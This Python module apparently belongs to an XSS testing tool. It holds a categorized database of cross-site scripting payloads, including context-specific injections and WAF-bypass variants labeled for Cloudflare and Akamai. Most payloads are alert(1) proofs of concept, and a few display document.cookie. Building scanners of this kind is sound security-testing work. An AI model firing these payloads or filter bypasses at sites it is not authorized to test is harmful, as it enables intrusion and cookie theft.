"""
Payload database
"""

from typing import List, Dict


class PayloadDatabase:
    """Built-in payload database"""
    
    def __init__(self):
        self.payloads = self._load_payloads()
    
    def _load_payloads(self) -> Dict[str, List[str]]:
        """Load built-in payloads"""
        return {
            'basic': self._get_basic_payloads(),
            'aggressive': self._get_aggressive_payloads(),
            'event_handlers': self._get_event_handler_payloads(),
            'svg_based': self._get_svg_payloads(),
            'polyglot': self._get_polyglot_payloads(),
            'dom_based': self._get_dom_payloads(),
            'context_html': self._get_html_context_payloads(),
            'context_attribute': self._get_attribute_context_payloads(),
            'context_javascript': self._get_javascript_context_payloads(),
            'context_url': self._get_url_context_payloads(),
            'waf_bypass_cloudflare': self._get_cloudflare_bypass(),
            'waf_bypass_akamai': self._get_akamai_bypass(),
            'waf_bypass_generic': self._get_generic_bypass(),
        }
    
    def get_by_category(self, category: str) -> List[str]:
        """Get payloads by category"""
        return self.payloads.get(category, [])
    
    def get_all(self) -> List[str]:
        """Get all payloads"""
        all_payloads = []
        for category_payloads in self.payloads.values():
            all_payloads.extend(category_payloads)
        return list(set(all_payloads))  # Remove duplicates
    
    def _get_basic_payloads(self) -> List[str]:
        """Basic XSS payloads"""
        return [
            "<script>alert('XSS')</script>",
            "<script>alert(1)</script>",
            "<script>alert(document.domain)</script>",
            "<script>confirm('XSS')</script>",
            "<script>prompt('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert('XSS')>",
            "<svg onload=alert(1)>",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus>",
            "<textarea onfocus=alert('XSS') autofocus>",
            "<iframe src=javascript:alert('XSS')>",
            "<iframe src='data:text/html,<script>alert(1)</script>'>",
            "<object data='data:text/html,<script>alert(1)</script>'>",
            "<embed src='data:text/html,<script>alert(1)</script>'>",
            "javascript:alert('XSS')",
            "javascript:alert(1)",
        ]

    def _get_aggressive_payloads(self) -> List[str]:
        """Aggressive payloads that may access sensitive browser data."""
        return [
            "<script>alert(document.cookie)</script>",
            "javascript:alert(document.cookie)",
        ]
    
    def _get_event_handler_payloads(self) -> List[str]:
        """Event handler based payloads"""
        handlers = [
            'onload', 'onerror', 'onmouseover', 'onclick', 'onfocus',
            'onblur', 'onchange', 'onsubmit', 'onreset', 'onselect',
            'onkeydown', 'onkeyup', 'onkeypress', 'onmousedown', 'onmouseup',
            'ondblclick', 'oncontextmenu', 'oninput', 'oninvalid',
            'onwheel', 'ondrag', 'ondrop', 'onscroll', 'onresize',
            'onpageshow', 'onpagehide', 'onbeforeunload', 'onunload',
            'onabort', 'oncanplay', 'oncanplaythrough', 'ondurationchange',
            'onemptied', 'onended', 'onloadeddata', 'onloadedmetadata',
            'onloadstart', 'onpause', 'onplay', 'onplaying', 'onprogress',
            'onratechange', 'onseeked', 'onseeking', 'onstalled',
            'onsuspend', 'ontimeupdate', 'onvolumechange', 'onwaiting',
        ]
        
        tags = [
            '<img src=x {handler}=alert(1)>',
            '<body {handler}=alert(1)>',
            '<svg {handler}=alert(1)>',
            '<input {handler}=alert(1) autofocus>',
            '<select {handler}=alert(1) autofocus>',
            '<textarea {handler}=alert(1) autofocus>',
            '<details {handler}=alert(1) open>',
            '<marquee {handler}=alert(1)>',
            '<audio src=x {handler}=alert(1)>',
            '<video src=x {handler}=alert(1)>',
        ]
        
        payloads = []
        for handler in handlers[:30]:  # Limit to 30 handlers
            for tag in tags[:5]:  # Limit to 5 tags
                payloads.append(tag.format(handler=handler))
        
        return payloads
    
    def _get_svg_payloads(self) -> List[str]:
        """SVG-based payloads"""
        return [
            "<svg onload=alert(1)>",
            "<svg><script>alert(1)</script></svg>",
            "<svg><script>alert&#40;1&#41;</script></svg>",
            "<svg><script>&#97;lert(1)</script></svg>",
            '<svg><script href="#"/>',
            "<svg><animate onbegin=alert(1)>",
            "<svg><set onbegin=alert(1)>",
            "<svg><animatetransform onbegin=alert(1)>",
            '<svg><a xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="javascript:alert(1)"><rect width="100" height="100"/></a></svg>',
            '<svg><use href="data:image/svg+xml,<svg id=x xmlns=http://www.w3.org/2000/svg><script>alert(1)</script></svg>#x" />',
        ]
    
    def _get_polyglot_payloads(self) -> List[str]:
        """Polyglot payloads (work in multiple contexts)"""
        return [
            "';alert(1)//",
            '";alert(1)//',
            "javascript:alert(1)//",
            "'><script>alert(1)</script>",
            '"><script>alert(1)</script>',
            "';alert(String.fromCharCode(88,83,83))//",
            '";alert(String.fromCharCode(88,83,83))//\\";alert(String.fromCharCode(88,83,83))//-->',
            "'-alert(1)-'",
            '"-alert(1)-"',
            "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//> ",
        ]
    
    def _get_dom_payloads(self) -> List[str]:
        """DOM-based XSS payloads"""
        return [
            "#<script>alert(1)</script>",
            "#<img src=x onerror=alert(1)>",
            "#';alert(1)//",
            "#';alert(document.domain)//",
            "#javascript:alert(1)",
        ]
    
    def _get_html_context_payloads(self) -> List[str]:
        """HTML context specific payloads"""
        return [
            "<script>alert(1)</script>",
            "<scr<script>ipt>alert(1)</scr</script>ipt>",
            "<script>alert(String.fromCharCode(88,83,83))</script>",
            "<script>eval('\\x61lert(1)')</script>",
            "<script>eval(atob('YWxlcnQoMSk='))</script>",
            "<<SCRIPT>alert(1);//<</SCRIPT>",
            "<script>alert(1)<!--",
            "<script><!--alert(1)--></script>",
            "<script>alert(1);</script>",
        ]
    
    def _get_attribute_context_payloads(self) -> List[str]:
        """Attribute context specific payloads"""
        return [
            "' autofocus onfocus=alert(1) x='",
            '" autofocus onfocus=alert(1) x="',
            "' onmouseover=alert(1) x='",
            '" onmouseover=alert(1) x="',
            "' onclick=alert(1) x='",
            '" onclick=alert(1) x="',
            "'/><script>alert(1)</script>",
            '"/><script>alert(1)</script>',
            "'><img src=x onerror=alert(1)>",
            '"><img src=x onerror=alert(1)>',
            "' accesskey='x' onclick='alert(1)' x='",
        ]
    
    def _get_javascript_context_payloads(self) -> List[str]:
        """JavaScript context specific payloads"""
        return [
            "';alert(1)//",
            '";alert(1)//',
            "'-alert(1)-'",
            '"-alert(1)-"',
            "\\';alert(1)//",
            '\\";alert(1)//',
            "';alert(String.fromCharCode(88,83,83))//",
            '";alert(String.fromCharCode(88,83,83))//',
            "`alert(1)`",
            "${alert(1)}",
        ]
    
    def _get_url_context_payloads(self) -> List[str]:
        """URL context specific payloads"""
        return [
            "javascript:alert(1)",
            "javascript:alert('XSS')",
            "javascript:alert(document.domain)",
            "javascript:void(alert(1))",
            "javascript:window.onerror=alert;throw 1",
            "data:text/html,<script>alert(1)</script>",
            "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
            "vbscript:alert(1)",
        ]
    
    def _get_cloudflare_bypass(self) -> List[str]:
        """Cloudflare WAF bypass payloads"""
        return [
            "<svg/onload=alert(1)>",
            "<svg%0Aonload%0D=alert(1)>",
            "<img src=1 onerror=alert(1)>",
            "<img src=1 oNeRRor=alert(1)>",
            "<img src=1 OnErRoR=alert(1)>",
            "<img src=1 o\x00nerror=alert(1)>",
            "<iMg src=1 onerror=alert(1)>",
            "<svg><script>alert&#40;1&#41;</script>",
            "<svg><script>&#97;lert(1)</script>",
            "<svg><script>&#x61;lert(1)</script>",
        ]
    
    def _get_akamai_bypass(self) -> List[str]:
        """Akamai WAF bypass payloads"""
        return [
            "<d3v onpointerenter=alert(1)>test</d3v>",
            "<details open ontoggle=alert(1)>",
            "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
            "<marquee onstart=alert(1)>",
            "<input autofocus onfocus=alert(1)>",
            "<select autofocus onfocus=alert(1)>",
            "<textarea autofocus onfocus=alert(1)>",
            "<keygen autofocus onfocus=alert(1)>",
        ]
    
    def _get_generic_bypass(self) -> List[str]:
        """Generic WAF bypass techniques"""
        return [
            "<ScRiPt>alert(1)</sCrIpT>",
            "<SCRIPT>alert(1)</SCRIPT>",
            
            "<scr<!--comment-->ipt>alert(1)</scr<!--comment-->ipt>",
            "<scr/*comment*/ipt>alert(1)</scr/*comment*/ipt>",
            
            "<script>ale\\u0072t(1)</script>",
            "<script>\\u0061lert(1)</script>",
            "<script>eval('\\x61lert(1)')</script>",
            
            "<script>alert(1)</script>",
            "<img src=x onerror=\\x61lert(1)>",
            
            "<img/src=x/onerror=alert(1)>",
            "<img\tsrc=x\tonerror=alert(1)>",
            "<img\nsrc=x\nonerror=alert(1)>",
            "<img\rsrc=x\ronerror=alert(1)>",
        ]
